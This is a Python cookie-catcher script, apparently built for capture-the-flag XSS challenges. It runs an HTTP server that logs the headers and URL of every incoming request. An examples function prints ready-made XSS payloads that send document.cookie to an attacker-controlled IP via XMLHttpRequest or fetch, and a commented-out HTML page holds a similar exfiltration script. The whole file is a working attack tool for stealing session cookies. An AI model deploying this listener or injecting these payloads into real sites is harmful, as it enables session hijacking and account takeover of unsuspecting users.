from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        # print("COOKIES:\n", self.headers['Cookie'])
        print("HEADERS:\n", self.headers)
        print("URL:\n", self.path)
        self.send_response(200)
        self.end_headers()


    def do_POST(self):
        # print("COOKIES:\n", self.headers['Cookie'])
        print("HEADERS:\n", self.headers)
        print("URL:\n", self.path)
        # js_code = '''
        # <!DOCTYPE html>
        # <html lang="en">
        # <script>
        # var cookies = document.cookie;
        # fetch(`http://<IP>:8000/?flag=${encodeURIComponent(document.cookie)}`, {
        #     method: 'GET',
        # })
        # </script>
        # </html>
        # '''
        self.send_response(200)
        # self.send_header('Content-type', 'text/html')
        # self.send_header('Access-Control-Allow-Origin', '*')
        # self.send_header('X-Forwarded-For', '127.0.0.1')
        # self.send_header('Host', '127.0.0.1')
        # self.send_header('Origin', '127.0.0.1')
        self.end_headers()
        # self.wfile.write(js_code.encode('utf-8'))


def examples():
  print('Examples:')
  print('<script>var x=new XMLHttpRequest();x.open("POST","http://<IP>/",true);x.send(encodeURIComponent(document.cookie));</script>\n')
  print('<script>fetch("http://<IP>/"+document.cookie,{method:"GET"});</script>\n')


def run(port):
    httpd = HTTPServer(('', port), Server)

    print(f"[*] Starting server on port {port}...\n")
    examples()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    print("[*] Stopping server...\n")
    httpd.server_close()


if __name__ == '__main__':
    port = 8000

    if len(argv) == 2:
        port = int(argv[1])
    run(port)
